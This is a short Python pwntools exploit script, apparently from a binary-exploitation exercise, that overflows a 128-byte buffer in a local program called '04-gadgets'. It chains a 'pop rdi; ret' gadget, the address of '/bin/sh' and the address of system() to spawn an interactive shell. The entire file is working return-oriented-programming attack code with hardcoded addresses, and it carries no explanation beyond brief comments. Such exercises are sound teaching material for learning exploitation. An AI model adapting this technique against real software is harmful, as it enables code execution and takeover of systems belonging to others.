#!/usr/bin/python

from pwn import *

context(arch='x86', os='linux', endian='little', word_size=64)

p = process('./04-gadgets')

system = 0x7ffff7a5b640
binsh = 0x7ffff7b91cdb
pop_rdi = 0x00000000004005d3

payload = ''
payload += 'a' * 128                  # buffer
payload += 'b' * 8                    # old rbp
payload += struct.pack('<Q', pop_rdi) # "pop rdi; ret" addr
payload += struct.pack('<Q', binsh)   # "/bin/sh" addr
payload += struct.pack('<Q', system)  # system addr

p.send(payload)

p.interactive()
